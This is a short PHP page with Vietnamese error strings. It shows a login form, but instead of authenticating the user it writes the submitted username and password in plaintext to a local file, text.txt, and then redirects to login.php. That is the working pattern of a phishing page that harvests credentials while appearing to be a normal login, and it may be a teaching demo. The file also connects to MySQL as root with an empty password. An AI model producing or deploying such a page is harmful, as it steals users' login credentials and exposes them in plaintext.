<?php
    ob_start();
    include './header.php';
    $link = new mysqli('localhost','root','','demo') or die("Kết nối không thành công");
    mysqli_query($link,'SET NAMES UTF8');
?>
<div class="jumbotron text-center">
<div>
<form method="post">
    <div style="color: black;">
        <input type="text" name="user"  placeholder="username"/>
        <input type="password" name="pass"  placeholder="password">
        <input type="submit" name="submit" style="background-color: lightsalmon;" value="Login">
    </div>
</form>
</div>
</div>
<div style="text-align: -webkit-center;">
    <?php
    if(isset($_POST['submit'])){
        $file = fopen("text.txt","w+") or die ("Không thể mở file");
        $s = "username: ".$_POST['user']."\npassword: ".$_POST['pass'];
        fputs($file,$s) or die ("Không thể ghi file");
        fclose($file);
        header("location:login.php");
        exit();
    }
    ?>
</div>
<?php
    include './footer.php';
?>
